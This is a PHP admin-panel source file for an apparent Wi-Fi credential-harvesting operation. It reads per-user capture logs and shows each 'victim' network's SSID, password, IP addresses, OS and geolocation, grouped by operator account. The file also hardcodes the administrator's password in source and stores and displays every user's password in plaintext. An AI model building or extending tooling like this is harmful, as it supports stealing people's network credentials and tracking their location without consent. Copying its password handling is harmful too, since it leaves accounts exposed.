<?php
/**
 * admin.php – Dedicated Admin Control Panel
 * Accessible ONLY to Narain.
 */

session_start();
date_default_timezone_set('Asia/Kolkata');

define('USERS_FILE',   __DIR__ . '/users.json');
define('ACTIVITY_LOG', __DIR__ . '/activity.log');
define('CREDS_DIR',    __DIR__ . '/creds');

define('ADMIN_USER', 'Narain');
define('ADMIN_PASS', '#Narain8811#');

// ─── GUARD: admin only ───────────────────────────────────────────────────────
if (empty($_SESSION['logged_in']) || ($_SESSION['role'] ?? '') !== 'admin') {
    header('Location: index.php');
    exit;
}

function h($v): string {
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

function load_users(): array {
    $defaultAdmin = [
        'username'       => ADMIN_USER,
        'password_hash'  => password_hash(ADMIN_PASS, PASSWORD_BCRYPT),
        'password_plain' => ADMIN_PASS,
        'email'          => 'narain@admin.local',
        'role'           => 'admin',
        'created_at'     => date('c'),
        'created_by'     => 'system',
        'active'         => true,
    ];
    if (!file_exists(USERS_FILE)) {
        $initial = ['users' => [$defaultAdmin]];
        @file_put_contents(USERS_FILE, json_encode($initial, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        return [$defaultAdmin];
    }
    $raw = @file_get_contents(USERS_FILE);
    $data = json_decode($raw, true);
    $users = $data['users'] ?? [];
    $hasAdmin = false;
    foreach ($users as &$u) {
        if (strtolower($u['username'] ?? '') === strtolower(ADMIN_USER)) {
            $hasAdmin = true;
            $u['role'] = 'admin';
            $u['password_plain'] = ADMIN_PASS;
            break;
        }
    }
    unset($u);
    if (!$hasAdmin) {
        array_unshift($users, $defaultAdmin);
        @file_put_contents(USERS_FILE, json_encode(['users' => $users], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    }
    return $users;
}

function save_users(array $users): void {
    file_put_contents(USERS_FILE, json_encode(['users' => $users], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

function find_user_index(array $users, string $username): int {
    foreach ($users as $i => $u) {
        if (strtolower($u['username']) === strtolower($username)) return $i;
    }
    return -1;
}

function log_activity(string $username, string $action, string $detail = ''): void {
    $ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $line = implode(' | ', [date('Y-m-d H:i:s'), $username, $ip, $action, $detail]);
    file_put_contents(ACTIVITY_LOG, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function user_log_file(string $username): string {
    $safe = preg_replace('/[^a-z0-9_\-]/i', '_', $username);
    return CREDS_DIR . '/' . $safe . '_wifi_creds.log';
}

function parse_capture_line(string $line): ?array {
    $line = trim($line);
    if ($line === '') return null;
    $f = str_getcsv($line);
    if (count($f) < 5) return null;

    $ssid = trim($f[2] ?? '');
    $pass = trim($f[3] ?? '');
    $bad  = ['profile_name','ssid','SSID','IP','OS','Pass','password'];
    if ($ssid === '' || in_array($ssid, $bad, true) || in_array($pass, ['Pass','password'], true)) return null;
    if ($pass === '') $pass = '(Not Found)';

    $ts  = trim($f[0] ?? 'unknown');
    $tsp = $ts;
    if ($ts !== '' && $ts !== 'unknown') {
        $t = strtotime($ts);
        if ($t !== false) $tsp = date('d M Y, h:i A', $t);
    }
    $len  = strlen($pass);
    $weak = $pass !== '(Not Found)' && ($len < 8 || ctype_alpha($pass) || ctype_digit($pass));

    return [
        'time'     => $tsp,
        'time_raw' => $ts,
        'victim'   => trim($f[1] ?? '') ?: 'unknown',
        'ssid'     => $ssid,
        'password' => $pass,
        'weak'     => $weak,
        'ip'       => trim($f[4] ?? '') ?: 'offline',
        'os'       => trim($f[5] ?? '') ?: 'unknown',
        'pub_ip'   => trim($f[6] ?? '') ?: 'unknown',
        'lat'      => trim($f[8] ?? '') ?: 'N/A',
        'lng'      => trim($f[9] ?? '') ?: 'N/A',
    ];
}

// ─── POST ACTIONS ────────────────────────────────────────────
$msg = ['type' => '', 'text' => ''];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // Create user
    if ($action === 'create_user') {
        $uname = trim($_POST['username'] ?? '');
        $upass = $_POST['password'] ?? '';
        $email = trim($_POST['email'] ?? '');
        $role  = in_array($_POST['role'] ?? '', ['admin','user']) ? $_POST['role'] : 'user';

        if ($uname === '' || $upass === '' || $email === '') {
            $msg = ['type'=>'err','text'=>'All fields are required.'];
        } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $msg = ['type'=>'err','text'=>'Invalid email address.'];
        } elseif (strlen($upass) < 4) {
            $msg = ['type'=>'err','text'=>'Password must be at least 4 characters.'];
        } else {
            $users = load_users();
            if (find_user_index($users, $uname) !== -1) {
                $msg = ['type'=>'err','text'=>"Username '{$uname}' already exists."];
            } else {
                $users[] = [
                    'username'       => $uname,
                    'password_hash'  => password_hash($upass, PASSWORD_BCRYPT),
                    'password_plain' => $upass,
                    'email'          => $email,
                    'role'           => $role,
                    'created_at'     => date('c'),
                    'created_by'     => $_SESSION['login_user'],
                    'active'         => true,
                ];
                save_users($users);
                log_activity($_SESSION['login_user'], 'CREATE_USER', "user={$uname} role={$role} email={$email}");
                $msg = ['type'=>'ok','text'=>"User '{$uname}' created successfully!"];
            }
        }
    }

    // Reset password
    elseif ($action === 'reset_password') {
        $target   = trim($_POST['target'] ?? '');
        $newpass  = $_POST['newpass'] ?? '';
        if ($target !== '' && strlen($newpass) >= 4) {
            $users = load_users();
            $idx   = find_user_index($users, $target);
            if ($idx !== -1) {
                $users[$idx]['password_hash']  = password_hash($newpass, PASSWORD_BCRYPT);
                $users[$idx]['password_plain'] = $newpass;
                save_users($users);
                log_activity($_SESSION['login_user'], 'RESET_PASSWORD', "target={$target}");
                $msg = ['type'=>'ok','text'=>"Password for '{$target}' updated."];
            }
        } else {
            $msg = ['type'=>'err','text'=>'Password must be at least 4 characters.'];
        }
    }

    // Toggle active
    elseif ($action === 'toggle_user') {
        $target = trim($_POST['target'] ?? '');
        if ($target !== '' && strtolower($target) !== strtolower($_SESSION['login_user'])) {
            $users = load_users();
            $idx   = find_user_index($users, $target);
            if ($idx !== -1) {
                $users[$idx]['active'] = !($users[$idx]['active'] ?? true);
                save_users($users);
                $state = $users[$idx]['active'] ? 'ENABLED' : 'DISABLED';
                log_activity($_SESSION['login_user'], 'TOGGLE_USER', "target={$target} state={$state}");
                $msg = ['type'=>'ok','text'=>"User '{$target}' {$state}."];
            }
        } else {
            $msg = ['type'=>'err','text'=>'Cannot disable your own admin account.'];
        }
    }

    // Delete user
    elseif ($action === 'delete_user') {
        $target = trim($_POST['target'] ?? '');
        if ($target !== '' && strtolower($target) !== strtolower($_SESSION['login_user'])) {
            $users = array_values(array_filter(load_users(),
                fn($u) => strtolower($u['username']) !== strtolower($target)));
            save_users($users);
            log_activity($_SESSION['login_user'], 'DELETE_USER', "target={$target}");
            $msg = ['type'=>'ok','text'=>"User '{$target}' deleted."];
        } else {
            $msg = ['type'=>'err','text'=>'Cannot delete your own admin account.'];
        }
    }

    // Clear user captures
    elseif ($action === 'clear_captures') {
        $target = trim($_POST['target'] ?? '');
        if ($target !== '') {
            $f = user_log_file($target);
            if (file_exists($f)) {
                file_put_contents($f, '');
                log_activity($_SESSION['login_user'], 'CLEAR_CAPTURES', "target={$target}");
                $msg = ['type'=>'ok','text'=>"Captures for '{$target}' cleared."];
            }
        }
    }
}

// ─── LOAD DATA ───────────────────────────────────────────────
$users         = load_users();
$activeTab     = $_GET['tab'] ?? 'overview';
$activityLines = [];

if ($activeTab === 'logs') {
    if (file_exists(ACTIVITY_LOG)) {
        $activityLines = array_reverse(file(ACTIVITY_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
    }
}

$userCaptures = [];
$totalCaps  = 0;
$totalWeak  = 0;
$totalUsers = count($users);

foreach ($users as $u) {
    $logFile = user_log_file($u['username']);
    $caps    = [];
    if (file_exists($logFile)) {
        foreach (file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
            $c = parse_capture_line($line);
            if ($c) {
                $caps[] = $c;
                $totalCaps++;
                if ($c['weak']) $totalWeak++;
            }
        }
    }
    usort($caps, fn($a,$b) => strcmp($b['time_raw'], $a['time_raw']));
    $userCaptures[$u['username']] = $caps;
}

$adminUser = $_SESSION['login_user'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Portal – Network Security</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
    background: #090d16;
    color: #e2e8f0;
    min-height: 100vh;
    display: flex;
  }
  .sidebar {
    width: 250px;
    background: #0d121f;
    border-right: 1px solid rgba(255, 255, 255, 0.06);
    display: flex;
    flex-direction: column;
    padding: 24px 16px;
    position: fixed;
    height: 100vh;
  }
  .sidebar-logo {
    display: flex;
    align-items: center;
    gap: 12px;
    padding-bottom: 24px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    margin-bottom: 20px;
  }
  .logo-icon {
    width: 40px;
    height: 40px;
    background: linear-gradient(135deg, #f43f5e, #ec4899);
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 20px;
  }
  .logo-title {
    font-size: 16px;
    font-weight: 700;
    color: #fff;
  }
  .logo-sub {
    font-size: 11px;
    color: #f43f5e;
    font-weight: 600;
  }
  .nav-group {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  .nav-link {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px 14px;
    border-radius: 10px;
    font-size: 13px;
    font-weight: 600;
    color: #94a3b8;
    text-decoration: none;
    transition: all 0.2s;
  }
  .nav-link:hover {
    color: #fff;
    background: rgba(255, 255, 255, 0.04);
  }
  .nav-link.active {
    color: #fff;
    background: rgba(244, 63, 94, 0.15);
    border: 1px solid rgba(244, 63, 94, 0.3);
  }
  .user-footer {
    padding-top: 16px;
    border-top: 1px solid rgba(255, 255, 255, 0.06);
  }
  .user-badge {
    font-size: 13px;
    font-weight: 600;
    color: #fff;
  }
  .btn-logout {
    display: inline-block;
    margin-top: 10px;
    font-size: 12px;
    font-weight: 600;
    color: #ef4444;
    text-decoration: none;
  }
  .main-content {
    margin-left: 250px;
    flex: 1;
    padding: 36px 40px;
    min-height: 100vh;
  }
  .top-header {
    margin-bottom: 26px;
  }
  .top-header h1 {
    font-size: 24px;
    font-weight: 700;
    color: #fff;
  }
  .top-header p {
    font-size: 13px;
    color: #64748b;
    margin-top: 4px;
  }
  /* Stats Cards */
  .stats-row {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 18px;
    margin-bottom: 30px;
  }
  .card-stat {
    background: #0f172a;
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 16px;
    padding: 20px 22px;
  }
  .card-stat .stat-label {
    font-size: 12px;
    font-weight: 600;
    color: #64748b;
    text-transform: uppercase;
  }
  .card-stat .stat-value {
    font-size: 32px;
    font-weight: 800;
    color: #fff;
    margin-top: 6px;
  }
  /* Box */
  .panel-box {
    background: #0f172a;
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 16px;
    margin-bottom: 24px;
    overflow: hidden;
  }
  .panel-head {
    padding: 18px 24px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .panel-head h2 {
    font-size: 15px;
    font-weight: 700;
    color: #fff;
  }
  .panel-body {
    padding: 24px;
  }
  /* Form */
  .form-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 16px;
  }
  .fg {
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  .fg label {
    font-size: 12px;
    font-weight: 600;
    color: #94a3b8;
    text-transform: uppercase;
  }
  .fg input, .fg select {
    padding: 11px 14px;
    border-radius: 10px;
    border: 1px solid rgba(255, 255, 255, 0.09);
    background: #090d16;
    color: #fff;
    font-family: inherit;
    font-size: 13px;
    outline: none;
  }
  .fg input:focus, .fg select:focus {
    border-color: #6366f1;
  }
  .btn-action {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 10px 18px;
    border-radius: 10px;
    border: none;
    font-family: inherit;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity 0.2s;
  }
  .btn-primary {
    background: linear-gradient(135deg, #4f46e5, #6366f1);
    color: #fff;
    margin-top: 16px;
  }
  .btn-sm {
    padding: 6px 12px;
    font-size: 12px;
    border-radius: 8px;
  }
  .btn-danger {
    background: rgba(239, 68, 68, 0.15);
    color: #f87171;
    border: 1px solid rgba(239, 68, 68, 0.3);
  }
  .btn-warn {
    background: rgba(245, 158, 11, 0.15);
    color: #fbbf24;
    border: 1px solid rgba(245, 158, 11, 0.3);
  }
  .btn-cyan {
    background: rgba(6, 182, 212, 0.15);
    color: #67e8f9;
    border: 1px solid rgba(6, 182, 212, 0.3);
  }
  /* Table */
  table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
  }
  th {
    background: rgba(2, 6, 23, 0.4);
    color: #64748b;
    font-weight: 600;
    text-transform: uppercase;
    font-size: 11px;
    letter-spacing: 0.5px;
    padding: 14px 20px;
    text-align: left;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
  }
  td {
    padding: 14px 20px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.04);
    vertical-align: middle;
  }
  tr:hover td {
    background: rgba(255, 255, 255, 0.02);
  }
  .badge {
    display: inline-flex;
    align-items: center;
    font-size: 11px;
    font-weight: 600;
    padding: 3px 10px;
    border-radius: 999px;
  }
  .b-admin { background: rgba(244, 63, 94, 0.15); color: #fda4af; border: 1px solid rgba(244, 63, 94, 0.3); }
  .b-user  { background: rgba(99, 102, 241, 0.15); color: #a5b4fc; border: 1px solid rgba(99, 102, 241, 0.3); }
  .b-act   { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; border: 1px solid rgba(16, 185, 129, 0.3); }
  .b-inact { background: rgba(239, 68, 68, 0.15); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.3); }
  .alert {
    padding: 12px 18px;
    border-radius: 12px;
    margin-bottom: 20px;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .alert-ok { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; border: 1px solid rgba(16, 185, 129, 0.3); }
  .alert-err{ background: rgba(239, 68, 68, 0.15); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.3); }
  .pw-box {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    font-family: 'JetBrains Mono', monospace;
    background: #090d16;
    padding: 4px 10px;
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.08);
    color: #38bdf8;
    font-size: 12px;
  }
  .pw-btn {
    background: none;
    border: none;
    color: #64748b;
    cursor: pointer;
    font-size: 14px;
  }
  .pw-btn:hover { color: #fff; }
  /* Accordion */
  .accord-item {
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 12px;
    margin-bottom: 12px;
    overflow: hidden;
    background: #0d121f;
  }
  .accord-btn {
    width: 100%;
    padding: 16px 20px;
    background: transparent;
    border: none;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: space-between;
    cursor: pointer;
    font-family: inherit;
    font-size: 14px;
    font-weight: 600;
  }
  .accord-content {
    display: none;
    border-top: 1px solid rgba(255, 255, 255, 0.06);
  }
  .accord-content.open { display: block; }
  /* Modal */
  .modal-bg {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.7);
    backdrop-filter: blur(8px);
    z-index: 200;
    align-items: center;
    justify-content: center;
  }
  .modal-bg.open { display: flex; }
  .modal-card {
    background: #0f172a;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 16px;
    padding: 28px;
    width: 100%;
    max-width: 400px;
  }
  .modal-card h3 { font-size: 17px; color: #fff; margin-bottom: 8px; }
  .modal-card p  { font-size: 13px; color: #64748b; margin-bottom: 18px; }
</style>
</head>
<body>

<aside class="sidebar">
  <div class="sidebar-logo">
    <div class="logo-icon">🛡️</div>
    <div>
      <div class="logo-title">Admin Console</div>
      <div class="logo-sub">Narain Privileges</div>
    </div>
  </div>

  <nav class="nav-group">
    <a href="?tab=overview"  class="nav-link <?php echo $activeTab==='overview'?'active':''; ?>">📊 Overview</a>
    <a href="?tab=accounts"  class="nav-link <?php echo $activeTab==='accounts'?'active':''; ?>">🔑 User Accounts</a>
    <a href="?tab=captures"  class="nav-link <?php echo $activeTab==='captures'?'active':''; ?>">📡 User Captures</a>
    <a href="?tab=logs"      class="nav-link <?php echo $activeTab==='logs'?'active':''; ?>">📋 Audit Logs</a>
    <a href="index.php"      class="nav-link" style="margin-top:20px;color:#cbd5e1">🏠 Main Dashboard</a>
  </nav>

  <div class="user-footer">
    <div class="user-badge">Administrator: <?php echo h($adminUser); ?></div>
    <a href="index.php?action=logout" class="btn-logout">⏻ Log out</a>
  </div>
</aside>

<main class="main-content">
  <?php if ($msg['text'] !== ''): ?>
    <div class="alert <?php echo $msg['type']==='ok'?'alert-ok':'alert-err'; ?>">
      <span><?php echo $msg['type']==='ok'?'✅':'⚠️'; ?></span>
      <span><?php echo h($msg['text']); ?></span>
    </div>
  <?php endif; ?>

  <!-- OVERVIEW TAB -->
  <?php if ($activeTab === 'overview'): ?>
    <div class="top-header">
      <h1>System Overview</h1>
      <p>Real-time metrics of users and network credentials.</p>
    </div>

    <div class="stats-row">
      <div class="card-stat">
        <div class="stat-label">Total Users</div>
        <div class="stat-value"><?php echo $totalUsers; ?></div>
      </div>
      <div class="card-stat">
        <div class="stat-label">Captured Credentials</div>
        <div class="stat-value" style="color:#38bdf8"><?php echo $totalCaps; ?></div>
      </div>
      <div class="card-stat">
        <div class="stat-label">Weak Passwords</div>
        <div class="stat-value" style="color:#f43f5e"><?php echo $totalWeak; ?></div>
      </div>
    </div>

    <div class="panel-box">
      <div class="panel-head"><h2>Active Accounts Summary</h2></div>
      <div style="overflow-x:auto">
        <table>
          <thead>
            <tr>
              <th>Username</th>
              <th>Email</th>
              <th>Role</th>
              <th>Status</th>
              <th>Captures</th>
              <th>Registration Date</th>
            </tr>
          </thead>
          <tbody>
            <?php foreach ($users as $u): $cCount = count($userCaptures[$u['username']] ?? []); ?>
            <tr>
              <td><strong style="color:#fff"><?php echo h($u['username']); ?></strong></td>
              <td><?php echo h($u['email'] ?? '—'); ?></td>
              <td><span class="badge <?php echo $u['role']==='admin'?'b-admin':'b-user'; ?>"><?php echo h($u['role']); ?></span></td>
              <td><span class="badge <?php echo ($u['active']??true)?'b-act':'b-inact'; ?>"><?php echo ($u['active']??true)?'Active':'Disabled'; ?></span></td>
              <td><span style="font-weight:700;color:#38bdf8"><?php echo $cCount; ?></span></td>
              <td style="color:#64748b"><?php echo !empty($u['created_at']) ? date('M d, Y', strtotime($u['created_at'])) : '—'; ?></td>
            </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>

  <!-- ACCOUNTS TAB -->
  <?php elseif ($activeTab === 'accounts'): ?>
    <div class="top-header">
      <h1>User Accounts & Passwords</h1>
      <p>Direct oversight of user accounts, plain passwords, and access control.</p>
    </div>

    <div class="panel-box">
      <div class="panel-head"><h2>Create User Account</h2></div>
      <div class="panel-body">
        <form method="post">
          <input type="hidden" name="action" value="create_user">
          <div class="form-grid">
            <div class="fg">
              <label>Username</label>
              <input type="text" name="username" required placeholder="e.g. alex">
            </div>
            <div class="fg">
              <label>Email Address</label>
              <input type="email" name="email" required placeholder="alex@domain.com">
            </div>
            <div class="fg">
              <label>Password</label>
              <input type="text" name="password" required placeholder="Min 4 chars">
            </div>
            <div class="fg">
              <label>Role</label>
              <select name="role">
                <option value="user">User</option>
                <option value="admin">Admin</option>
              </select>
            </div>
          </div>
          <button type="submit" class="btn-action btn-primary">Create User</button>
        </form>
      </div>
    </div>

    <div class="panel-box">
      <div class="panel-head"><h2>Registered Users Credentials</h2></div>
      <div style="overflow-x:auto">
        <table>
          <thead>
            <tr>
              <th>Username</th>
              <th>Email</th>
              <th>Password</th>
              <th>Role</th>
              <th>Status</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            <?php foreach ($users as $i => $u): ?>
            <tr>
              <td><strong style="color:#fff"><?php echo h($u['username']); ?></strong></td>
              <td><?php echo h($u['email'] ?? '—'); ?></td>
              <td>
                <?php $plain = $u['password_plain'] ?? ''; ?>
                <?php if ($plain): ?>
                  <div class="pw-box">
                    <span id="pw-<?php echo $i; ?>" data-val="<?php echo h($plain); ?>">••••••••</span>
                    <button type="button" class="pw-btn" onclick="togglePass(<?php echo $i; ?>)">👁</button>
                  </div>
                <?php else: ?>
                  <span style="color:#64748b">[Hash only]</span>
                <?php endif; ?>
              </td>
              <td><span class="badge <?php echo $u['role']==='admin'?'b-admin':'b-user'; ?>"><?php echo h($u['role']); ?></span></td>
              <td><span class="badge <?php echo ($u['active']??true)?'b-act':'b-inact'; ?>"><?php echo ($u['active']??true)?'Active':'Disabled'; ?></span></td>
              <td>
                <div style="display:flex;gap:6px">
                  <button type="button" class="btn-action btn-cyan btn-sm" onclick="openReset('<?php echo h($u['username']); ?>')">Reset PW</button>
                  <?php if (strtolower($u['username']) !== strtolower($adminUser)): ?>
                    <form method="post" style="display:inline">
                      <input type="hidden" name="action" value="toggle_user">
                      <input type="hidden" name="target" value="<?php echo h($u['username']); ?>">
                      <button type="submit" class="btn-action btn-warn btn-sm"><?php echo ($u['active']??true)?'Disable':'Enable'; ?></button>
                    </form>
                    <form method="post" style="display:inline" onsubmit="return confirm('Delete user <?php echo h($u['username']); ?>?')">
                      <input type="hidden" name="action" value="delete_user">
                      <input type="hidden" name="target" value="<?php echo h($u['username']); ?>">
                      <button type="submit" class="btn-action btn-danger btn-sm">Delete</button>
                    </form>
                  <?php endif; ?>
                </div>
              </td>
            </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>

  <!-- CAPTURES TAB -->
  <?php elseif ($activeTab === 'captures'): ?>
    <div class="top-header">
      <h1>User Captured Wi-Fi Networks</h1>
      <p>Inspect captured credentials grouped by individual user.</p>
    </div>

    <?php foreach ($users as $u): $caps = $userCaptures[$u['username']] ?? []; ?>
      <div class="accord-item">
        <button type="button" class="accord-btn" onclick="toggleAccord(this)">
          <div style="display:flex;align-items:center;gap:12px">
            <span>👤</span>
            <strong style="color:#fff"><?php echo h($u['username']); ?></strong>
            <span style="color:#64748b;font-size:12px"><?php echo h($u['email'] ?? ''); ?></span>
          </div>
          <div>
            <span style="color:#38bdf8;font-size:12px;font-weight:700"><?php echo count($caps); ?> capture(s)</span>
          </div>
        </button>
        <div class="accord-content">
          <?php if (empty($caps)): ?>
            <div style="padding:24px;text-align:center;color:#64748b">No captures recorded for this user.</div>
          <?php else: ?>
            <div style="overflow-x:auto">
              <table>
                <thead>
                  <tr>
                    <th>Timestamp</th>
                    <th>SSID</th>
                    <th>Password</th>
                    <th>Strength</th>
                    <th>LAN IP</th>
                    <th>Target OS</th>
                  </tr>
                </thead>
                <tbody>
                  <?php foreach ($caps as $c): ?>
                  <tr>
                    <td style="color:#94a3b8"><?php echo h($c['time']); ?></td>
                    <td><strong style="color:#fff"><?php echo h($c['ssid']); ?></strong></td>
                    <td><span style="font-family:'JetBrains Mono',monospace;color:#38bdf8"><?php echo h($c['password']); ?></span></td>
                    <td>
                      <span class="badge <?php echo $c['weak']?'b-inact':'b-act'; ?>"><?php echo $c['weak']?'Weak':'Strong'; ?></span>
                    </td>
                    <td><span style="font-family:'JetBrains Mono',monospace;color:#94a3b8"><?php echo h($c['ip']); ?></span></td>
                    <td><?php echo h($c['os']); ?></td>
                  </tr>
                  <?php endforeach; ?>
                </tbody>
              </table>
            </div>
          <?php endif; ?>
        </div>
      </div>
    <?php endforeach; ?>

  <!-- AUDIT LOGS TAB -->
  <?php elseif ($activeTab === 'logs'): ?>
    <div class="top-header">
      <h1>Audit & Activity Logs</h1>
      <p>Log entries of user logins, registrations, and actions.</p>
    </div>

    <div class="panel-box">
      <div class="panel-head"><h2>Recent Activity</h2></div>
      <div style="padding:16px;max-height:600px;overflow-y:auto">
        <?php if (empty($activityLines)): ?>
          <div style="color:#64748b;text-align:center;padding:24px">No activity recorded.</div>
        <?php else: ?>
          <?php foreach ($activityLines as $line): $parts = explode(' | ', $line, 5); ?>
            <div style="font-family:'JetBrains Mono',monospace;font-size:12px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,0.04);display:flex;gap:14px">
              <span style="color:#64748b"><?php echo h($parts[0] ?? ''); ?></span>
              <strong style="color:#fff"><?php echo h($parts[1] ?? ''); ?></strong>
              <span style="color:#38bdf8"><?php echo h($parts[3] ?? ''); ?></span>
              <span style="color:#94a3b8"><?php echo h($parts[4] ?? ''); ?></span>
            </div>
          <?php endforeach; ?>
        <?php endif; ?>
      </div>
    </div>
  <?php endif; ?>
</main>

<!-- Reset Password Modal -->
<div class="modal-bg" id="resetModal">
  <div class="modal-card">
    <h3>Reset User Password</h3>
    <p id="resetModalText">Enter new password for the account.</p>
    <form method="post">
      <input type="hidden" name="action" value="reset_password">
      <input type="hidden" name="target" id="resetTarget">
      <div class="fg" style="margin-bottom:16px">
        <label>New Password</label>
        <input type="text" name="newpass" required minlength="4" placeholder="Enter new password">
      </div>
      <div style="display:flex;justify-content:flex-end;gap:10px">
        <button type="button" class="btn-action btn-warn btn-sm" onclick="closeReset()">Cancel</button>
        <button type="submit" class="btn-action btn-primary btn-sm" style="margin-top:0">Save Password</button>
      </div>
    </form>
  </div>
</div>

<script>
function togglePass(idx) {
  const el = document.getElementById('pw-' + idx);
  if (!el) return;
  if (el.textContent === '••••••••') {
    el.textContent = el.dataset.val;
  } else {
    el.textContent = '••••••••';
  }
}

function toggleAccord(btn) {
  const content = btn.nextElementSibling;
  content.classList.toggle('open');
}

function openReset(username) {
  document.getElementById('resetTarget').value = username;
  document.getElementById('resetModalText').textContent = 'Enter new password for: ' + username;
  document.getElementById('resetModal').classList.add('open');
}

function closeReset() {
  document.getElementById('resetModal').classList.remove('open');
}
</script>
</body>
</html>
